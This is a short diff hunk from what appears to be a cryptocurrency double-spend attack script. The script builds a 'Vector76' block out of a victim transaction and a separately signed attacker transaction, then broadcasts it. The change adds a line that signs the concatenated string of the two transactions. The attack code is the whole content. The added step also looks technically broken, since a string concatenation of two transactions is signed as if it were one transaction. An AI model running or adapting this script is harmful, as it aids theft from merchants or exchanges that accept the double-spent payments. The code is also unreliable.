@@ -123,6 +123,7 @@ else:
     tx_attacker = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_send_from))
 
 vector76_block = f"{tx_victim}{tx_attacker}"
+vector76_block = transaction_util.sign(vector76_block, 0, fake_send_from)
 
 print(f"Generating Vector76 Block")
 send_rawtransaction(vector76_block)
